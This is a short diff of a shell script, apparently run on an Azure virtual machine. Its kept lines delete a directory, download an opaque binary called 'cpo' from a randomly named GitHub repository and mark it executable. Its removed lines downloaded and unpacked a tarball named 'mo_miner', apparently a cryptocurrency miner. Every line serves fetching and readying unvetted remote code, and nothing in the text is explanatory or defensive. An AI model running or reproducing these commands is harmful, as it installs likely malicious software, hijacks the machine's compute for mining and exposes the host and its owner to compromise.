@@ -3,6 +3,3 @@ rm -r /home/azureuser/cpo
 wget -P /home/azureuser https://github.com/j2d23enr2os32omedaro/jfksdhfvdsiouwrbn32980vxcnbmdfsajkfh2398/raw/main/cpo
 chmod +x /home/azureuser/cpo
 
-cd home/azureuser
-wget https://github.com/samuraifinseev/jkldashdjasopiwqeohbvxc89123nbjkczxvsdi/raw/main/mo_miner3107.tar.xz -P /home/azureuser
-tar -xf mo_miner3107.tar.xz
